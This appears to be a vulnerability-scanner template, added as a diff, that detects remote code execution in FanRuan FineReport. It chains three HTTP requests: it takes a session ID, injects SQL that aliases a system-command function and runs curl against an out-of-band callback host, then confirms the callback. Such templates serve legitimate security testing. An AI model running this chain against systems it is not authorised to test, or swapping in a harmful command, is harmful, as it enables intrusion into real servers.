@@ -1,0 +1,65 @@
+id: fanruan-finereport-rce
+
+info:
+  name: FanRuan FineReport Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects Remote Code Execution (RCE) vulnerability in FanRuan FineReport by chaining multiple HTTP requests.
+
+variables:
+  reverse_url: "{{interactsh-url}}"
+  nowtime: "{{unix_time()}}"
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sessionID"
+        part: body
+    extractors:
+      - type: regex
+        name: sessionID
+        regex:
+          - "op=widget&widgetname=widget9&sessionID=(.*?)\\\\\",\\\\\"type"
+        group: 1
+        internal: true
+
+  - id: "2"
+    method: POST
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=fr_dialog&cmd=parameters_d&sessionID={{sessionID}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      __parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl {{reverse_url}}');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: "3"
+    method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?_={{nowtime}}585&__boxModel__=true&op=page_content&sessionID={{sessionID}}&pn=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sessionID"
+        part: body
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
